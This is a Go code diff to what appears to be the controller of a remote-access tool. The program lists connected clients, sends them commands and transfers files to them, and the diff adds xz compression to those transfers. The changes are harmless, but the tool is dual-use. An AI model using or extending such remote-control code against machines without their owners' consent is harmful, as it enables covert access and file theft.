@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	_ "embed"
 	"errors"
 	"fmt"
@@ -23,6 +24,7 @@ import (
 	"fyne.io/fyne/v2/theme"
 	"fyne.io/fyne/v2/widget"
 	"github.com/go-toast/toast"
+	"github.com/ulikunitz/xz"
 )
 
 //go:embed lib/client.req
@@ -108,6 +110,25 @@ func addClient(client *Connection, Info string) {
 	table.Refresh()
 }
 
+func compress(data []byte) []byte {
+	var buff bytes.Buffer
+
+	writer, _ := xz.NewWriter(&buff)
+	writer.Write(data)
+	writer.Close()
+
+	return buff.Bytes()
+}
+
+func decompress(data []byte) []byte {
+	var buff bytes.Buffer
+
+	reader, _ := xz.NewReader(bytes.NewReader(data))
+	buff.ReadFrom(reader)
+
+	return buff.Bytes()
+}
+
 func removeClient(client *Connection) {
 	for i, cli := range clients {
 		if cli.conn == client.conn {
@@ -170,11 +191,9 @@ func handleClient(client *Connection) {
 				exec.Command("explorer.exe", ".\\").Start()
 
 			case "<DOWNLOAD>":
-				for {
-					data := readAll("<END>")
-					os.WriteFile(filename, []byte(data), 0644)
-					exec.Command("explorer.exe", ".\\").Start()
-				}
+				data := readAll("<END>")
+				os.WriteFile(filename, decompress([]byte(data)), 0644)
+				exec.Command("explorer.exe", ".\\").Start()
 			}
 		}
 		time.Sleep(time.Millisecond * 200)
@@ -504,7 +523,7 @@ func main() {
 							if err == nil {
 								writeCommand("\x14")
 								writeCommand(filepath.Base(strings.TrimSpace(myEntry1.Text)))
-								writeCommand(string(data))
+								writeCommand(string(compress(data)))
 								writeCommand("<END>")
 							}
 						} else {
